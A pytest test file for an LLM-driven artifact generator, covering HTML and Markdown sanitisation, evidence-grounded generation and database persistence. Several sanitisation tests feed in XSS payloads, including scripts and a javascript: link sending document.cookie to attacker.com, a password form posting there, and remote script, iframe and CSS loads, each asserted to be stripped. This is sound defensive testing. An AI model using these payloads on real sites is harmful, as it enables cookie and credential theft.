"""Artifact generation, sanitisation and persistence."""

from __future__ import annotations

import pytest

from app.artifacts.generator import generate_artifact
from app.artifacts.validation import validate_artifact
from app.errors import ArtifactInvalidError

from .conftest import DEFAULT_CHUNKS, FakeProvider

HTML = "<h1>Growth one-pager</h1><p>Retention flattens after PMF.</p>"


# --- sanitisation ---------------------------------------------------------


def test_scripts_are_stripped_from_html():
    report = validate_artifact("html", HTML + "<script>fetch('/steal')</script>")
    assert "<script" not in report.content.lower()
    assert report.sanitized


def test_event_handlers_and_js_urls_are_stripped():
    report = validate_artifact(
        "html",
        '<h1>Hi</h1><div onclick="alert(1)">x</div><a href="javascript:alert(1)">link</a>',
    )
    assert "onclick" not in report.content.lower()
    assert "javascript:" not in report.content.lower()
    assert report.sanitized


def test_nested_frames_are_stripped():
    report = validate_artifact("html", HTML + '<iframe src="https://evil.example"></iframe>')
    assert "<iframe" not in report.content.lower()


def test_markdown_with_embedded_script_is_sanitized():
    report = validate_artifact("markdown", "# Doc\n\n<script>alert(1)</script>\n\nBody")
    assert "<script" not in report.content.lower()
    assert "embedded_html_in_markdown" in report.removed


def test_clean_markdown_is_untouched():
    report = validate_artifact("markdown", "# Doc\n\n- one\n- two")
    assert report.sanitized is False
    assert report.content == "# Doc\n\n- one\n- two"
    assert report.byte_size > 0


def test_unknown_kind_is_rejected():
    with pytest.raises(ArtifactInvalidError):
        validate_artifact("pdf", "whatever")


def test_empty_artifact_is_rejected():
    with pytest.raises(ArtifactInvalidError):
        validate_artifact("markdown", "   ")


def test_oversized_artifact_is_rejected():
    from app.config import get_settings

    with pytest.raises(ArtifactInvalidError):
        validate_artifact("markdown", "x" * (get_settings().artifact_max_bytes + 1))


def test_html_without_markup_is_rejected():
    with pytest.raises(ArtifactInvalidError):
        validate_artifact("html", "just prose, no tags")


# --- generation -----------------------------------------------------------


def test_generation_grounds_the_prompt_in_evidence():
    provider = FakeProvider([f"```html\n{HTML}\n```"])
    artifact = generate_artifact(
        provider, kind="html", instruction="Build a growth one-pager", chunks=DEFAULT_CHUNKS
    )
    assert artifact.kind == "html"
    assert artifact.title
    assert "<h1>" in artifact.content
    prompt = provider.calls[0]["messages"][0]["content"]
    assert DEFAULT_CHUNKS[0].content[:40] in prompt


def test_generation_sanitizes_model_output():
    artifact = generate_artifact(
        FakeProvider([HTML + "<script>alert(1)</script>"]),
        kind="html",
        instruction="Build a one-pager",
        chunks=DEFAULT_CHUNKS,
    )
    assert "<script" not in artifact.content.lower()
    assert artifact.report.sanitized


def test_generation_requires_evidence():
    with pytest.raises(Exception):
        generate_artifact(FakeProvider([HTML]), kind="html", instruction="Build a one-pager", chunks=[])


# --- persistence + API ----------------------------------------------------


def test_artifact_turn_persists_and_is_retrievable(client, session_id):
    client.provider.responses = ["", f"```html\n{HTML}\n```"]
    response = client.post(
        f"/sessions/{session_id}/messages",
        json={"message": "Build me an HTML one-pager on growth loops", "capability": "artifact"},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    artifact = body["artifact"]
    assert artifact["kind"] == "html"
    assert artifact["session_id"] == session_id
    assert artifact["byte_size"] > 0
    assert artifact["citations"]

    fetched = client.get(f"/artifacts/{artifact['id']}")
    assert fetched.status_code == 200
    assert fetched.json()["content"] == artifact["content"]


def test_unknown_artifact_returns_not_found_envelope(client):
    import uuid

    response = client.get(f"/artifacts/{uuid.uuid4()}")
    assert response.status_code == 404
    assert response.json()["error"]["code"] == "not_found"


def test_markdown_artifact_full_features(client, session_id):
    md_content = (
        "# Growth Checklist\n\n"
        "## Core Principles\n\n"
        "- **Retention First**: Verify cohort flattening\n"
        "- **Activation**: Track time-to-value [1]\n\n"
        "See [Lenny Podcast](https://lennysnewsletter.com) for details.\n\n"
        "```python\n"
        "def retention_rate(users_active, users_cohort):\n"
        "    return users_active / users_cohort\n"
        "```\n"
    )
    client.provider.responses = ["", md_content]
    response = client.post(
        f"/sessions/{session_id}/messages",
        json={"message": "Create a Markdown growth checklist", "capability": "artifact"},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    artifact = body["artifact"]
    assert artifact["kind"] == "markdown"
    assert artifact["title"] == "Growth Checklist"
    assert "## Core Principles" in artifact["content"]
    assert "**Retention First**" in artifact["content"]
    assert "```python" in artifact["content"]
    assert "https://lennysnewsletter.com" in artifact["content"]


def test_html_css_artifact_preserves_legitimate_styles():
    styled_html = (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        "<title>Conversion Dashboard</title>\n"
        "<style>\n"
        "  body { font-family: sans-serif; background: #fafafa; color: #111; }\n"
        "  .card { padding: 1.5rem; border-radius: 8px; border: 1px solid #e0e0e0; }\n"
        "  .metric { font-size: 2rem; font-weight: bold; color: #2563eb; }\n"
        "</style>\n"
        "</head>\n"
        "<body>\n"
        "<div class=\"card\">\n"
        "  <h1>Activation Rate</h1>\n"
        "  <p class=\"metric\">42.8%</p>\n"
        "</div>\n"
        "</body>\n"
        "</html>"
    )
    report = validate_artifact("html", styled_html)
    assert "<style>" in report.content
    assert ".card { padding: 1.5rem;" in report.content
    assert "font-weight: bold;" in report.content
    assert "Conversion Dashboard" in report.content


def test_security_malicious_xss_vectors_stripped():
    malicious_html = (
        "<h1>Legitimate Title</h1>\n"
        "<script>window.parent.document.cookie = 'stolen';</script>\n"
        "<script src=\"https://evil.com/payload.js\"></script>\n"
        "<img src=\"x\" onerror=\"localStorage.clear();\">\n"
        "<a href=\"javascript:fetch('http://attacker.com?c=' + document.cookie)\">Link</a>\n"
        "<iframe src=\"https://attacker.com/steal-creds\"></iframe>\n"
        "<object data=\"https://attacker.com/exploit.swf\"></object>\n"
        "<embed src=\"https://attacker.com/exploit.swf\">\n"
        "<form action=\"https://attacker.com/steal\"><input type=\"password\" name=\"p\"></form>\n"
        "<style>@import url('https://attacker.com/leak.css'); body { color: red; }</style>\n"
        "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com\">\n"
    )
    report = validate_artifact("html", malicious_html)

    assert "<script" not in report.content.lower()
    assert "onerror=" not in report.content.lower()
    assert "javascript:" not in report.content.lower()
    assert "<iframe" not in report.content.lower()
    assert "<object" not in report.content.lower()
    assert "<embed" not in report.content.lower()
    assert "<form" not in report.content.lower()
    assert "@import" not in report.content.lower()
    assert "<meta" not in report.content.lower()
    assert report.sanitized is True
    # Verify legitimate markup was preserved
    assert "<h1>Legitimate Title</h1>" in report.content
    assert "body { color: red; }" in report.content


def test_session_artifact_isolation(client):
    # Create Session A with Artifact A
    s_a = client.post("/sessions", json={"title": "Session A"}).json()["id"]
    client.provider.responses = ["", "# Artifact A\n\nContent A"]
    r_a = client.post(
        f"/sessions/{s_a}/messages",
        json={"message": "Build Artifact A", "capability": "artifact"},
    )
    assert r_a.status_code == 200
    art_a_id = r_a.json()["artifact"]["id"]

    # Create Session B with Artifact B
    s_b = client.post("/sessions", json={"title": "Session B"}).json()["id"]
    client.provider.responses = ["", "# Artifact B\n\nContent B"]
    r_b = client.post(
        f"/sessions/{s_b}/messages",
        json={"message": "Build Artifact B", "capability": "artifact"},
    )
    assert r_b.status_code == 200
    art_b_id = r_b.json()["artifact"]["id"]

    # Verify Session A artifacts contains ONLY Artifact A
    artifacts_a = client.get(f"/sessions/{s_a}/artifacts").json()["artifacts"]
    ids_a = [a["id"] for a in artifacts_a]
    assert art_a_id in ids_a
    assert art_b_id not in ids_a

    # Verify Session B artifacts contains ONLY Artifact B
    artifacts_b = client.get(f"/sessions/{s_b}/artifacts").json()["artifacts"]
    ids_b = [a["id"] for a in artifacts_b]
    assert art_b_id in ids_b
    assert art_a_id not in ids_b


def test_artifact_persistence_survives_session_reload(client, session_id):
    client.provider.responses = ["", "# Persistent Artifact\n\nSaved content."]
    post_res = client.post(
        f"/sessions/{session_id}/messages",
        json={"message": "Build persistent document", "capability": "artifact"},
    )
    assert post_res.status_code == 200
    artifact_id = post_res.json()["artifact"]["id"]

    # Reload full session details
    detail_res = client.get(f"/sessions/{session_id}")
    assert detail_res.status_code == 200
    session_data = detail_res.json()
    assert session_data["session"]["artifact_count"] >= 1

    # Reload artifact directly
    art_res = client.get(f"/artifacts/{artifact_id}")
    assert art_res.status_code == 200
    assert art_res.json()["title"] == "Persistent Artifact"
    assert "Saved content." in art_res.json()["content"]


def test_markdown_and_html_artifacts_persisted_in_database_and_fresh_context(client, session_id, db_sessionmaker):
    import uuid
    from app.db.models import Artifact as ArtifactModel

    # 1. Generate Markdown artifact
    client.provider.responses = ["", "# Retention One-Pager\n\n- Flattening curve [1]\n- Day 1 activation"]
    md_res = client.post(
        f"/sessions/{session_id}/messages",
        json={"message": "Build a Markdown one-pager on retention", "capability": "artifact"},
    )
    assert md_res.status_code == 200
    md_art = md_res.json()["artifact"]
    assert md_art is not None
    assert md_art["kind"] == "markdown"
    md_art_id = uuid.UUID(md_art["id"])

    # 2. Verify directly in DB with a completely fresh session
    with db_sessionmaker() as db_fresh:
        row = db_fresh.get(ArtifactModel, md_art_id)
        assert row is not None
        assert row.kind == "markdown"
        assert row.title == "Retention One-Pager"
        assert "Flattening curve" in row.content

    # 3. Generate HTML artifact in the same session
    client.provider.responses = ["", "<h1>Activation Card</h1><p class='metric'>85%</p>"]
    html_res = client.post(
        f"/sessions/{session_id}/messages",
        json={"message": "Build an HTML card for activation", "capability": "artifact"},
    )
    assert html_res.status_code == 200
    html_art = html_res.json()["artifact"]
    assert html_art is not None
    assert html_art["kind"] == "html"
    html_art_id = uuid.UUID(html_art["id"])

    # 4. Verify both artifacts exist in fresh DB query
    with db_sessionmaker() as db_fresh:
        rows = db_fresh.query(ArtifactModel).filter(ArtifactModel.session_id == uuid.UUID(session_id)).all()
        assert len(rows) == 2
        row_ids = {r.id for r in rows}
        assert md_art_id in row_ids
        assert html_art_id in row_ids

    # 5. Verify /sessions/{id}/artifacts endpoint in a fresh HTTP call
    list_res = client.get(f"/sessions/{session_id}/artifacts")
    assert list_res.status_code == 200
    listed_artifacts = list_res.json()["artifacts"]
    assert len(listed_artifacts) == 2
    listed_ids = [a["id"] for a in listed_artifacts]
    assert str(md_art_id) in listed_ids
    assert str(html_art_id) in listed_ids

    # 6. Verify individual /artifacts/{id} endpoints match
    for aid, expected_kind in [(md_art_id, "markdown"), (html_art_id, "html")]:
        single_res = client.get(f"/artifacts/{aid}")
        assert single_res.status_code == 200
        data = single_res.json()
        assert data["id"] == str(aid)
        assert data["kind"] == expected_kind
        assert len(data["content"]) > 0

